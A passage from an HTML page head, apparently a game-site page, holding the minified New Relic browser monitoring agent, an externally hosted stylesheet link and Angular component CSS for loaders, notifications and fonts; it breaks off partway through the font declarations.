                    var r = t[e];
                    "function" == typeof r && (t[e] = function() {
                        var t = r.apply(this, arguments);
                        return o.emit(n + "start", arguments, t), t.then(function(e) {
                            return o.emit(n + "end", [null, e], t), e
                        }, function(e) {
                            throw o.emit(n + "end", [e], t), e
                        })
                    })
                }
                var o = t("ee").get("fetch"),
                    i = t(21);
                e.exports = o;
                var a = window,
                    s = "fetch-",
                    c = s + "body-",
                    f = ["arrayBuffer", "blob", "json", "text", "formData"],
                    u = a.Request,
                    d = a.Response,
                    p = a.fetch,
                    l = "prototype";
                u && d && p && (i(f, function(t, e) {
                    r(u[l], e, c), r(d[l], e, c)
                }), r(a, "fetch", s), o.on(s + "end", function(t, e) {
                    var n = this;
                    if (e) {
                        var r = e.headers.get("content-length");
                        null !== r && (n.rxSize = r), o.emit(s + "done", [null, e], n)
                    } else o.emit(s + "done", [t], n)
                }))
            }, {}],
            8: [function(t, e, n) {
                var r = t("ee").get("history"),
                    o = t(24)(r);
                e.exports = r, o.inPlace(window.history, ["pushState", "replaceState"], "-")
            }, {}],
            9: [function(t, e, n) {
                function r(t) {
                    function e() {
                        c.emit("jsonp-end", [], p), t.removeEventListener("load", e, !1), t.removeEventListener("error", n, !1)
                    }

                    function n() {
                        c.emit("jsonp-error", [], p), c.emit("jsonp-end", [], p), t.removeEventListener("load", e, !1), t.removeEventListener("error", n, !1)
                    }
                    var r = t && "string" == typeof t.nodeName && "script" === t.nodeName.toLowerCase();
                    if (r) {
                        var o = "function" == typeof t.addEventListener;
                        if (o) {
                            var a = i(t.src);
                            if (a) {
                                var u = s(a),
                                    d = "function" == typeof u.parent[u.key];
                                if (d) {
                                    var p = {};
                                    f.inPlace(u.parent, [u.key], "cb-", p), t.addEventListener("load", e, !1), t.addEventListener("error", n, !1), c.emit("new-jsonp", [t.src], p)
                                }
                            }
                        }
                    }
                }

                function o() {
                    return "addEventListener" in window
                }

                function i(t) {
                    var e = t.match(u);
                    return e ? e[1] : null
                }

                function a(t, e) {
                    var n = t.match(p),
                        r = n[1],
                        o = n[3];
                    return o ? a(o, e[r]) : e[r]
                }

                function s(t) {
                    var e = t.match(d);
                    return e && e.length >= 3 ? {
                        key: e[2],
                        parent: a(e[1], window)
                    } : {
                        key: t,
                        parent: window
                    }
                }
                var c = t("ee").get("jsonp"),
                    f = t(24)(c);
                if (e.exports = c, o()) {
                    var u = /[?&](?:callback|cb)=([^&#]+)/,
                        d = /(.*)\.([^.]+)/,
                        p = /^(\w+)(\.|$)(.*)$/,
                        l = ["appendChild", "insertBefore", "replaceChild"];
                    f.inPlace(HTMLElement.prototype, l, "dom-"), f.inPlace(HTMLHeadElement.prototype, l, "dom-"), f.inPlace(HTMLBodyElement.prototype, l, "dom-"), c.on("dom-start", function(t) {
                        r(t[0])
                    })
                }
            }, {}],
            10: [function(t, e, n) {
                var r = t("ee").get("mutation"),
                    o = t(24)(r),
                    i = NREUM.o.MO;
                e.exports = r, i && (window.MutationObserver = function(t) {
                    return this instanceof i ? new i(o(t, "fn-")) : i.apply(this, arguments)
                }, MutationObserver.prototype = i.prototype)
            }, {}],
            11: [function(t, e, n) {
                function r(t) {
                    var e = a.context(),
                        n = s(t, "executor-", e),
                        r = new f(n);
                    return a.context(r).getCtx = function() {
                        return e
                    }, a.emit("new-promise", [r, e], e), r
                }

                function o(t, e) {
                    return e
                }
                var i = t(24),
                    a = t("ee").get("promise"),
                    s = i(a),
                    c = t(21),
                    f = NREUM.o.PR;
                e.exports = a, f && (window.Promise = r, ["all", "race"].forEach(function(t) {
                    var e = f[t];
                    f[t] = function(n) {
                        function r(t) {
                            return function() {
                                a.emit("propagate", [null, !o], i), o = o || !t
                            }
                        }
                        var o = !1;
                        c(n, function(e, n) {
                            Promise.resolve(n).then(r("all" === t), r(!1))
                        });
                        var i = e.apply(f, arguments),
                            s = f.resolve(i);
                        return s
                    }
                }), ["resolve", "reject"].forEach(function(t) {
                    var e = f[t];
                    f[t] = function(t) {
                        var n = e.apply(f, arguments);
                        return t !== n && a.emit("propagate", [t, !0], n), n
                    }
                }), f.prototype["catch"] = function(t) {
                    return this.then(null, t)
                }, f.prototype = Object.create(f.prototype, {
                    constructor: {
                        value: r
                    }
                }), c(Object.getOwnPropertyNames(f), function(t, e) {
                    try {
                        r[e] = f[e]
                    } catch (n) {}
                }), a.on("executor-start", function(t) {
                    t[0] = s(t[0], "resolve-", this), t[1] = s(t[1], "resolve-", this)
                }), a.on("executor-err", function(t, e, n) {
                    t[1](n)
                }), s.inPlace(f.prototype, ["then"], "then-", o), a.on("then-start", function(t, e) {
                    this.promise = e, t[0] = s(t[0], "cb-", this), t[1] = s(t[1], "cb-", this)
                }), a.on("then-end", function(t, e, n) {
                    this.nextPromise = n;
                    var r = this.promise;
                    a.emit("propagate", [r, !0], n)
                }), a.on("cb-end", function(t, e, n) {
                    a.emit("propagate", [n, !0], this.nextPromise)
                }), a.on("propagate", function(t, e, n) {
                    this.getCtx && !e || (this.getCtx = function() {
                        if (t instanceof Promise) var e = a.context(t);
                        return e && e.getCtx ? e.getCtx() : this
                    })
                }), r.toString = function() {
                    return "" + f
                })
            }, {}],
            12: [function(t, e, n) {
                var r = t("ee").get("raf"),
                    o = t(24)(r),
                    i = "equestAnimationFrame";
                e.exports = r, o.inPlace(window, ["r" + i, "mozR" + i, "webkitR" + i, "msR" + i], "raf-"), r.on("raf-start", function(t) {
                    t[0] = o(t[0], "fn-")
                })
            }, {}],
            13: [function(t, e, n) {
                function r(t, e, n) {
                    t[0] = a(t[0], "fn-", null, n)
                }

                function o(t, e, n) {
                    this.method = n, this.timerDuration = isNaN(t[1]) ? 0 : +t[1], t[0] = a(t[0], "fn-", this, n)
                }
                var i = t("ee").get("timer"),
                    a = t(24)(i),
                    s = "setTimeout",
                    c = "setInterval",
                    f = "clearTimeout",
                    u = "-start",
                    d = "-";
                e.exports = i, a.inPlace(window, [s, "setImmediate"], s + d), a.inPlace(window, [c], c + d), a.inPlace(window, [f, "clearImmediate"], f + d), i.on(c + u, r), i.on(s + u, o)
            }, {}],
            14: [function(t, e, n) {
                function r(t, e) {
                    d.inPlace(e, ["onreadystatechange"], "fn-", s)
                }

                function o() {
                    var t = this,
                        e = u.context(t);
                    t.readyState > 3 && !e.resolved && (e.resolved = !0, u.emit("xhr-resolved", [], t)), d.inPlace(t, y, "fn-", s)
                }

                function i(t) {
                    g.push(t), h && (x ? x.then(a) : v ? v(a) : (E = -E, O.data = E))
                }

                function a() {
                    for (var t = 0; t < g.length; t++) r([], g[t]);
                    g.length && (g = [])
                }

                function s(t, e) {
                    return e
                }

                function c(t, e) {
                    for (var n in t) e[n] = t[n];
                    return e
                }
                t(6);
                var f = t("ee"),
                    u = f.get("xhr"),
                    d = t(24)(u),
                    p = NREUM.o,
                    l = p.XHR,
                    h = p.MO,
                    m = p.PR,
                    v = p.SI,
                    w = "readystatechange",
                    y = ["onload", "onerror", "onabort", "onloadstart", "onloadend", "onprogress", "ontimeout"],
                    g = [];
                e.exports = u;
                var b = window.XMLHttpRequest = function(t) {
                    var e = new l(t);
                    try {
                        u.emit("new-xhr", [e], e), e.addEventListener(w, o, !1)
                    } catch (n) {
                        try {
                            u.emit("internal-error", [n])
                        } catch (r) {}
                    }
                    return e
                };
                if (c(l, b), b.prototype = l.prototype, d.inPlace(b.prototype, ["open", "send"], "-xhr-", s), u.on("send-xhr-start", function(t, e) {
                        r(t, e), i(e)
                    }), u.on("open-xhr-start", r), h) {
                    var x = m && m.resolve();
                    if (!v && !m) {
                        var E = 1,
                            O = document.createTextNode(E);
                        new h(a).observe(O, {
                            characterData: !0
                        })
                    }
                } else f.on("fn-end", function(t) {
                    t[0] && t[0].type === w || a()
                })
            }, {}],
            15: [function(t, e, n) {
                function r(t) {
                    var e = this.params,
                        n = this.metrics;
                    if (!this.ended) {
                        this.ended = !0;
                        for (var r = 0; r < d; r++) t.removeEventListener(u[r], this.listener, !1);
                        if (!e.aborted) {
                            if (n.duration = a.now() - this.startTime, 4 === t.readyState) {
                                e.status = t.status;
                                var i = o(t, this.lastSize);
                                if (i && (n.rxSize = i), this.sameOrigin) {
                                    var c = t.getResponseHeader("X-NewRelic-App-Data");
                                    c && (e.cat = c.split(", ").pop())
                                }
                            } else e.status = 0;
                            n.cbTime = this.cbTime, f.emit("xhr-done", [t], t), s("xhr", [e, n, this.startTime])
                        }
                    }
                }

                function o(t, e) {
                    var n = t.responseType;
                    if ("json" === n && null !== e) return e;
                    var r = "arraybuffer" === n || "blob" === n || "json" === n ? t.response : t.responseText;
                    return h(r)
                }

                function i(t, e) {
                    var n = c(e),
                        r = t.params;
                    r.host = n.hostname + ":" + n.port, r.pathname = n.pathname, t.sameOrigin = n.sameOrigin
                }
                var a = t("loader");
                if (a.xhrWrappable) {
                    var s = t("handle"),
                        c = t(16),
                        f = t("ee"),
                        u = ["load", "error", "abort", "timeout"],
                        d = u.length,
                        p = t("id"),
                        l = t(19),
                        h = t(18),
                        m = window.XMLHttpRequest;
                    a.features.xhr = !0, t(14), f.on("new-xhr", function(t) {
                        var e = this;
                        e.totalCbs = 0, e.called = 0, e.cbTime = 0, e.end = r, e.ended = !1, e.xhrGuids = {}, e.lastSize = null, l && (l > 34 || l < 10) || window.opera || t.addEventListener("progress", function(t) {
                            e.lastSize = t.loaded
                        }, !1)
                    }), f.on("open-xhr-start", function(t) {
                        this.params = {
                            method: t[0]
                        }, i(this, t[1]), this.metrics = {}
                    }), f.on("open-xhr-end", function(t, e) {
                        "loader_config" in NREUM && "xpid" in NREUM.loader_config && this.sameOrigin && e.setRequestHeader("X-NewRelic-ID", NREUM.loader_config.xpid)
                    }), f.on("send-xhr-start", function(t, e) {
                        var n = this.metrics,
                            r = t[0],
                            o = this;
                        if (n && r) {
                            var i = h(r);
                            i && (n.txSize = i)
                        }
                        this.startTime = a.now(), this.listener = function(t) {
                            try {
                                "abort" === t.type && (o.params.aborted = !0), ("load" !== t.type || o.called === o.totalCbs && (o.onloadCalled || "function" != typeof e.onload)) && o.end(e)
                            } catch (n) {
                                try {
                                    f.emit("internal-error", [n])
                                } catch (r) {}
                            }
                        };
                        for (var s = 0; s < d; s++) e.addEventListener(u[s], this.listener, !1)
                    }), f.on("xhr-cb-time", function(t, e, n) {
                        this.cbTime += t, e ? this.onloadCalled = !0 : this.called += 1, this.called !== this.totalCbs || !this.onloadCalled && "function" == typeof n.onload || this.end(n)
                    }), f.on("xhr-load-added", function(t, e) {
                        var n = "" + p(t) + !!e;
                        this.xhrGuids && !this.xhrGuids[n] && (this.xhrGuids[n] = !0, this.totalCbs += 1)
                    }), f.on("xhr-load-removed", function(t, e) {
                        var n = "" + p(t) + !!e;
                        this.xhrGuids && this.xhrGuids[n] && (delete this.xhrGuids[n], this.totalCbs -= 1)
                    }), f.on("addEventListener-end", function(t, e) {
                        e instanceof m && "load" === t[0] && f.emit("xhr-load-added", [t[1], t[2]], e)
                    }), f.on("removeEventListener-end", function(t, e) {
                        e instanceof m && "load" === t[0] && f.emit("xhr-load-removed", [t[1], t[2]], e)
                    }), f.on("fn-start", function(t, e, n) {
                        e instanceof m && ("onload" === n && (this.onload = !0), ("load" === (t[0] && t[0].type) || this.onload) && (this.xhrCbStart = a.now()))
                    }), f.on("fn-end", function(t, e) {
                        this.xhrCbStart && f.emit("xhr-cb-time", [a.now() - this.xhrCbStart, this.onload, e], e)
                    })
                }
            }, {}],
            16: [function(t, e, n) {
                e.exports = function(t) {
                    var e = document.createElement("a"),
                        n = window.location,
                        r = {};
                    e.href = t, r.port = e.port;
                    var o = e.href.split("://");
                    !r.port && o[1] && (r.port = o[1].split("/")[0].split("@").pop().split(":")[1]), r.port && "0" !== r.port || (r.port = "https" === o[0] ? "443" : "80"), r.hostname = e.hostname || n.hostname, r.pathname = e.pathname, r.protocol = o[0], "/" !== r.pathname.charAt(0) && (r.pathname = "/" + r.pathname);
                    var i = !e.protocol || ":" === e.protocol || e.protocol === n.protocol,
                        a = e.hostname === document.domain && e.port === n.port;
                    return r.sameOrigin = i && (!e.hostname || a), r
                }
            }, {}],
            17: [function(t, e, n) {
                function r() {}

                function o(t, e, n) {
                    return function() {
                        return i(t, [f.now()].concat(s(arguments)), e ? null : this, n), e ? void 0 : this
                    }
                }
                var i = t("handle"),
                    a = t(21),
                    s = t(22),
                    c = t("ee").get("tracer"),
                    f = t("loader"),
                    u = NREUM;
                "undefined" == typeof window.newrelic && (newrelic = u);
                var d = ["setPageViewName", "setCustomAttribute", "setErrorHandler", "finished", "addToTrace", "inlineHit", "addRelease"],
                    p = "api-",
                    l = p + "ixn-";
                a(d, function(t, e) {
                    u[e] = o(p + e, !0, "api")
                }), u.addPageAction = o(p + "addPageAction", !0), u.setCurrentRouteName = o(p + "routeName", !0), e.exports = newrelic, u.interaction = function() {
                    return (new r).get()
                };
                var h = r.prototype = {
                    createTracer: function(t, e) {
                        var n = {},
                            r = this,
                            o = "function" == typeof e;
                        return i(l + "tracer", [f.now(), t, n], r),
                            function() {
                                if (c.emit((o ? "" : "no-") + "fn-start", [f.now(), r, o], n), o) try {
                                    return e.apply(this, arguments)
                                } catch (t) {
                                    throw c.emit("fn-err", [arguments, this, t], n), t
                                } finally {
                                    c.emit("fn-end", [f.now()], n)
                                }
                            }
                    }
                };
                a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","), function(t, e) {
                    h[e] = o(l + e)
                }), newrelic.noticeError = function(t, e) {
                    "string" == typeof t && (t = new Error(t)), i("err", [t, f.now(), !1, e])
                }
            }, {}],
            18: [function(t, e, n) {
                e.exports = function(t) {
                    if ("string" == typeof t && t.length) return t.length;
                    if ("object" == typeof t) {
                        if ("undefined" != typeof ArrayBuffer && t instanceof ArrayBuffer && t.byteLength) return t.byteLength;
                        if ("undefined" != typeof Blob && t instanceof Blob && t.size) return t.size;
                        if (!("undefined" != typeof FormData && t instanceof FormData)) try {
                            return JSON.stringify(t).length
                        } catch (e) {
                            return
                        }
                    }
                }
            }, {}],
            19: [function(t, e, n) {
                var r = 0,
                    o = navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);
                o && (r = +o[1]), e.exports = r
            }, {}],
            20: [function(t, e, n) {
                function r(t, e) {
                    if (!o) return !1;
                    if (t !== o) return !1;
                    if (!e) return !0;
                    if (!i) return !1;
                    for (var n = i.split("."), r = e.split("."), a = 0; a < r.length; a++)
                        if (r[a] !== n[a]) return !1;
                    return !0
                }
                var o = null,
                    i = null,
                    a = /Version\/(\S+)\s+Safari/;
                if (navigator.userAgent) {
                    var s = navigator.userAgent,
                        c = s.match(a);
                    c && s.indexOf("Chrome") === -1 && s.indexOf("Chromium") === -1 && (o = "Safari", i = c[1])
                }
                e.exports = {
                    agent: o,
                    version: i,
                    match: r
                }
            }, {}],
            21: [function(t, e, n) {
                function r(t, e) {
                    var n = [],
                        r = "",
                        i = 0;
                    for (r in t) o.call(t, r) && (n[i] = e(r, t[r]), i += 1);
                    return n
                }
                var o = Object.prototype.hasOwnProperty;
                e.exports = r
            }, {}],
            22: [function(t, e, n) {
                function r(t, e, n) {
                    e || (e = 0), "undefined" == typeof n && (n = t ? t.length : 0);
                    for (var r = -1, o = n - e || 0, i = Array(o < 0 ? 0 : o); ++r < o;) i[r] = t[e + r];
                    return i
                }
                e.exports = r
            }, {}],
            23: [function(t, e, n) {
                e.exports = {
                    exists: "undefined" != typeof window.performance && window.performance.timing && "undefined" != typeof window.performance.timing.navigationStart
                }
            }, {}],
            24: [function(t, e, n) {
                function r(t) {
                    return !(t && t instanceof Function && t.apply && !t[a])
                }
                var o = t("ee"),
                    i = t(22),
                    a = "nr@original",
                    s = Object.prototype.hasOwnProperty,
                    c = !1;
                e.exports = function(t, e) {
                    function n(t, e, n, o) {
                        function nrWrapper() {
                            var r, a, s, c;
                            try {
                                a = this, r = i(arguments), s = "function" == typeof n ? n(r, a) : n || {}
                            } catch (f) {
                                p([f, "", [r, a, o], s])
                            }
                            u(e + "start", [r, a, o], s);
                            try {
                                return c = t.apply(a, r)
                            } catch (d) {
                                throw u(e + "err", [r, a, d], s), d
                            } finally {
                                u(e + "end", [r, a, c], s)
                            }
                        }
                        return r(t) ? t : (e || (e = ""), nrWrapper[a] = t, d(t, nrWrapper), nrWrapper)
                    }

                    function f(t, e, o, i) {
                        o || (o = "");
                        var a, s, c, f = "-" === o.charAt(0);
                        for (c = 0; c < e.length; c++) s = e[c], a = t[s], r(a) || (t[s] = n(a, f ? s + o : o, i, s))
                    }

                    function u(n, r, o) {
                        if (!c || e) {
                            var i = c;
                            c = !0;
                            try {
                                t.emit(n, r, o, e)
                            } catch (a) {
                                p([a, n, r, o])
                            }
                            c = i
                        }
                    }

                    function d(t, e) {
                        if (Object.defineProperty && Object.keys) try {
                            var n = Object.keys(t);
                            return n.forEach(function(n) {
                                Object.defineProperty(e, n, {
                                    get: function() {
                                        return t[n]
                                    },
                                    set: function(e) {
                                        return t[n] = e, e
                                    }
                                })
                            }), e
                        } catch (r) {
                            p([r])
                        }
                        for (var o in t) s.call(t, o) && (e[o] = t[o]);
                        return e
                    }

                    function p(e) {
                        try {
                            t.emit("internal-error", e)
                        } catch (n) {}
                    }
                    return t || (t = o), n.inPlace = f, n.flag = a, n
                }
            }, {}],
            ee: [function(t, e, n) {
                function r() {}

                function o(t) {
                    function e(t) {
                        return t && t instanceof r ? t : t ? c(t, s, i) : i()
                    }

                    function n(n, r, o, i) {
                        if (!p.aborted || i) {
                            t && t(n, r, o);
                            for (var a = e(o), s = m(n), c = s.length, f = 0; f < c; f++) s[f].apply(a, r);
                            var d = u[g[n]];
                            return d && d.push([b, n, r, a]), a
                        }
                    }

                    function l(t, e) {
                        y[t] = m(t).concat(e)
                    }

                    function h(t, e) {
                        var n = y[t];
                        if (n)
                            for (var r = 0; r < n.length; r++) n[r] === e && n.splice(r, 1)
                    }

                    function m(t) {
                        return y[t] || []
                    }

                    function v(t) {
                        return d[t] = d[t] || o(n)
                    }

                    function w(t, e) {
                        f(t, function(t, n) {
                            e = e || "feature", g[n] = e, e in u || (u[e] = [])
                        })
                    }
                    var y = {},
                        g = {},
                        b = {
                            on: l,
                            addEventListener: l,
                            removeEventListener: h,
                            emit: n,
                            get: v,
                            listeners: m,
                            context: e,
                            buffer: w,
                            abort: a,
                            aborted: !1
                        };
                    return b
                }

                function i() {
                    return new r
                }

                function a() {
                    (u.api || u.feature) && (p.aborted = !0, u = p.backlog = {})
                }
                var s = "nr@context",
                    c = t("gos"),
                    f = t(21),
                    u = {},
                    d = {},
                    p = e.exports = o();
                p.backlog = u
            }, {}],
            gos: [function(t, e, n) {
                function r(t, e, n) {
                    if (o.call(t, e)) return t[e];
                    var r = n();
                    if (Object.defineProperty && Object.keys) try {
                        return Object.defineProperty(t, e, {
                            value: r,
                            writable: !0,
                            enumerable: !1
                        }), r
                    } catch (i) {}
                    return t[e] = r, r
                }
                var o = Object.prototype.hasOwnProperty;
                e.exports = r
            }, {}],
            handle: [function(t, e, n) {
                function r(t, e, n, r) {
                    o.buffer([t], r), o.emit(t, e, n)
                }
                var o = t("ee").get("handle");
                e.exports = r, r.ee = o
            }, {}],
            id: [function(t, e, n) {
                function r(t) {
                    var e = typeof t;
                    return !t || "object" !== e && "function" !== e ? -1 : t === window ? 0 : a(t, i, function() {
                        return o++
                    })
                }
                var o = 1,
                    i = "nr@id",
                    a = t("gos");
                e.exports = r
            }, {}],
            loader: [function(t, e, n) {
                function r() {
                    if (!E++) {
                        var t = x.info = NREUM.info,
                            e = l.getElementsByTagName("script")[0];
                        if (setTimeout(u.abort, 3e4), !(t && t.licenseKey && t.applicationID && e)) return u.abort();
                        f(g, function(e, n) {
                            t[e] || (t[e] = n)
                        }), c("mark", ["onload", a() + x.offset], null, "api");
                        var n = l.createElement("script");
                        n.src = "https://" + t.agent, e.parentNode.insertBefore(n, e)
                    }
                }

                function o() {
                    "complete" === l.readyState && i()
                }

                function i() {
                    c("mark", ["domContent", a() + x.offset], null, "api")
                }

                function a() {
                    return O.exists && performance.now ? Math.round(performance.now()) : (s = Math.max((new Date).getTime(), s)) - x.offset
                }
                var s = (new Date).getTime(),
                    c = t("handle"),
                    f = t(21),
                    u = t("ee"),
                    d = t(20),
                    p = window,
                    l = p.document,
                    h = "addEventListener",
                    m = "attachEvent",
                    v = p.XMLHttpRequest,
                    w = v && v.prototype;
                NREUM.o = {
                    ST: setTimeout,
                    SI: p.setImmediate,
                    CT: clearTimeout,
                    XHR: v,
                    REQ: p.Request,
                    EV: p.Event,
                    PR: p.Promise,
                    MO: p.MutationObserver
                };
                var y = "" + location,
                    g = {
                        beacon: "bam.nr-data.net",
                        errorBeacon: "bam.nr-data.net",
                        agent: "js-agent.newrelic.com/nr-spa-1118.min.js"
                    },
                    b = v && w && w[h] && !/CriOS/.test(navigator.userAgent),
                    x = e.exports = {
                        offset: s,
                        now: a,
                        origin: y,
                        features: {},
                        xhrWrappable: b,
                        userAgent: d
                    };
                t(17), l[h] ? (l[h]("DOMContentLoaded", i, !1), p[h]("load", r, !1)) : (l[m]("onreadystatechange", o), p[m]("onload", r)), c("mark", ["firstbyte", s], null, "api");
                var E = 0,
                    O = t(23)
            }, {}]
        }, {}, ["loader", 2, 15, 5, 3, 4]);;
        NREUM.info = {
            beacon: "bam.nr-data.net",
            errorBeacon: "bam.nr-data.net",
            licenseKey: "e59e710ebb",
            applicationID: "277698390",
            sa: 1
        }
    </script>
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/DuniaGames/b3520afc1dd6134d4203aa4e6c97064e2014d19b/style-AlexHost.css">
    <meta http-equiv="origin-trial" content="A2shzsdPO+RKe83bUqT9oVkYwGZN6j9O7nrcOASNFPuQz8HefgVYb9qAqn6coNCSDIRtXoi6ybCrjEsYh3caFgIAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MTM0OTU4NjgsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
    <style>
        .ph-item[_ngcontent-gtc-c0] {
            -ms-flex-wrap: wrap;
            border: 1px solid #e6e6e6;
            border-radius: 2px;
            display: flex;
            flex-wrap: wrap;
            margin-bottom: 30px;
            overflow: hidden;
            padding: 30px 15px 15px
        }

        .ph-item[_ngcontent-gtc-c0],
        .ph-item[_ngcontent-gtc-c0] *[_ngcontent-gtc-c0],
        .ph-item[_ngcontent-gtc-c0] [_ngcontent-gtc-c0]:after,
        .ph-item[_ngcontent-gtc-c0] [_ngcontent-gtc-c0]:before {
            box-sizing: border-box
        }

        .ph-item[_ngcontent-gtc-c0]>*[_ngcontent-gtc-c0] {
            -ms-flex: 1 1 auto;
            -webkit-box-flex: 1;
            flex: 1 1 auto;
            flex-flow: column;
            padding-left: 15px;
            padding-right: 15px
        }

        .ph-item[_ngcontent-gtc-c0]>*[_ngcontent-gtc-c0],
        .ph-row[_ngcontent-gtc-c0] {
            display: flex
        }

        .ph-row[_ngcontent-gtc-c0] {
            flex-wrap: wrap;
            margin-bottom: 7.5px
        }

        .ph-row[_ngcontent-gtc-c0] div[_ngcontent-gtc-c0] {
            background-color: #232629;
            height: 10px;
            margin-bottom: 7.5px
        }

        .ph-row[_ngcontent-gtc-c0] .big[_ngcontent-gtc-c0],
        .ph-row.big[_ngcontent-gtc-c0] div[_ngcontent-gtc-c0] {
            height: 20px;
            margin-bottom: 15px
        }

        .ph-row[_ngcontent-gtc-c0] .empty[_ngcontent-gtc-c0] {
            background-color: rgba(255, 255, 255, 0)
        }

        .ph-col-2[_ngcontent-gtc-c0] {
            flex: 0 0 16.66667%
        }

        .ph-col-4[_ngcontent-gtc-c0] {
            flex: 0 0 33.33333%
        }

        .ph-col-6[_ngcontent-gtc-c0] {
            flex: 0 0 50%
        }

        .ph-col-8[_ngcontent-gtc-c0] {
            flex: 0 0 66.66667%
        }

        .ph-col-10[_ngcontent-gtc-c0] {
            flex: 0 0 83.33333%
        }

        .ph-col-12[_ngcontent-gtc-c0] {
            flex: 0 0 100%
        }

        .ph-avatar[_ngcontent-gtc-c0] {
            background-color: #232629;
            border-radius: 50%;
            margin-bottom: 15px;
            min-width: 60px;
            overflow: hidden;
            position: relative;
            width: 100%
        }

        .ph-avatar[_ngcontent-gtc-c0]:before {
            content: " ";
            display: block;
            padding-top: 100%
        }

        .ph-picture[_ngcontent-gtc-c0] {
            height: 120px;
            margin-bottom: 15px;
            width: 100%
        }

        @-webkit-keyframes phAnimation {
            0% {
                transform: translate3d(-30%, 0, 0)
            }
            to {
                transform: translate3d(30%, 0, 0)
            }
        }

        @keyframes phAnimation {
            0% {
                transform: translate3d(-30%, 0, 0)
            }
            to {
                transform: translate3d(30%, 0, 0)
            }
        }

        .ph-item[_ngcontent-gtc-c0] {
            position: fixed;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 9991;
            background: #1d1f23;
            border: none;
            height: 100%
        }

        .ph-item[_ngcontent-gtc-c0] .container[_ngcontent-gtc-c0] {
            display: block;
            flex: inherit
        }

        .ph-item[_ngcontent-gtc-c0]:before {
            content: " ";
            -webkit-animation: .8s linear infinite phAnimation;
            animation: .8s linear infinite phAnimation;
            background: linear-gradient(90deg, rgba(56, 56, 56, 0) 46%, rgba(53, 53, 53, .35) 50%, rgba(93, 93, 93, 0) 54%) 50% 50%;
            bottom: 0;
            content: " ";
            left: 50%;
            margin-left: -250%;
            position: absolute;
            right: 0;
            top: 0;
            width: 500%;
            z-index: 1
        }

        .ph-picture[_ngcontent-gtc-c0] {
            background: #232629
        }

        .widget[_ngcontent-gtc-c0] {
            height: 50px
        }

        .widget[_ngcontent-gtc-c0] iframe[_ngcontent-gtc-c0] {
            overflow: hidden;
            position: fixed;
            bottom: 0;
            height: inherit;
            z-index: 999
        }

        .notif[_ngcontent-gtc-c0] {
            color: #000;
            padding: 15px;
            background: #d6d6d6;
            border-radius: 4px;
            font-size: 1.2rem;
            line-height: 1.3;
            margin: 78px 265px 40px auto;
            max-width: 400px;
            position: fixed;
            z-index: 20;
            width: 350px;
            right: 0
        }

        .notif__frame[_ngcontent-gtc-c0] {
            border-top: 1px dashed #a5a4a4;
            padding-top: 10px;
            margin-top: 10px
        }

        .notif__title[_ngcontent-gtc-c0] {
            font-weight: 700;
            margin-bottom: 10px;
            color: #000
        }

        .notif__img[_ngcontent-gtc-c0] {
            width: 30%;
            float: left;
            margin-right: 5px
        }

        .notif__img[_ngcontent-gtc-c0] img[_ngcontent-gtc-c0] {
            border-radius: 80px;
            width: 80px;
            border: 0
        }

        .notif__contain[_ngcontent-gtc-c0] {
            font-family: Montserrat;
            font-size: 15px;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: normal;
            letter-spacing: normal;
            color: #69707e;
            width: 65%;
            float: left
        }

        .notif__close[_ngcontent-gtc-c0] {
            text-align: right;
            cursor: pointer
        }

        .notif__close[_ngcontent-gtc-c0] img[_ngcontent-gtc-c0] {
            width: 6%
        }

        .notif[_ngcontent-gtc-c0] p[_ngcontent-gtc-c0] {
            margin: 0 0 10px
        }

        .notif[_ngcontent-gtc-c0] p[_ngcontent-gtc-c0]:last-of-type {
            margin-bottom: 0
        }

        .notif[_ngcontent-gtc-c0]::after {
            border-left: 10px solid transparent;
            border-right: 10px solid transparent;
            border-bottom: 10px solid #d6d6d6;
            top: -10px;
            content: "";
            position: absolute;
            right: 20px
        }
    </style>
    <style>
        .loading-block[_ngcontent-gtc-c1] {
            text-align: center;
            position: fixed;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            background: rgba(0, 0, 0, .6);
            opacity: .9;
            z-index: 9991;
            visibility: hidden;
            opacity: 0;
            transition: .3s ease-in-out
        }

        .loading-block[_ngcontent-gtc-c1] img[_ngcontent-gtc-c1] {
            top: 45%;
            position: relative;
            left: 0
        }

        .loading-block.active[_ngcontent-gtc-c1] {
            opacity: 1;
            visibility: visible
        }

        .loading-block[_ngcontent-gtc-c1] #load[_ngcontent-gtc-c1] {
            width: 80px;
            top: 50%;
            transform: translateY(-50%);
            position: absolute;
            left: 0;
            right: 0;
            margin: auto;
            -webkit-animation: 3s linear infinite loading;
            animation: 3s linear infinite loading
        }

        .loading-block[_ngcontent-gtc-c1] #load[_ngcontent-gtc-c1] #loading-inner[_ngcontent-gtc-c1] {
            stroke-dashoffset: 0;
            stroke-dasharray: 300;
            stroke-width: 10;
            stroke-miterlimit: 10;
            stroke-linecap: round;
            -webkit-animation: 2s linear infinite loading-circle;
            animation: 2s linear infinite loading-circle;
            stroke: #d0021b;
            fill: transparent
        }

        @-webkit-keyframes loading {
            0% {
                transform: rotate(0)
            }
            100% {
                transform: rotate(360deg)
            }
        }

        @keyframes loading {
            0% {
                transform: rotate(0)
            }
            100% {
                transform: rotate(360deg)
            }
        }

        @-webkit-keyframes loading-circle {
            0% {
                stroke-dashoffset: 0
            }
            100% {
                stroke-dashoffset: -600
            }
        }

        @keyframes loading-circle {
            0% {
                stroke-dashoffset: 0
            }
            100% {
                stroke-dashoffset: -600
            }
        }
    </style>
    <style>
        @font-face {
            font-family: Montserrat;
            font-weight: 100;
            font-style: normal;
            src: url(.assets/.css/Montserrat-Thin.cb2144b361907d6549a8.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 100;
            font-style: italic;
            src: url(.assets/.css/Montserrat-ThinItalic.4e85bb77e2e7805a17a9.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 200;
            font-style: normal;
            src: url(.assets/.css/Montserrat-ExtraLight.2ec7cecb19c1b42ca9ca.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
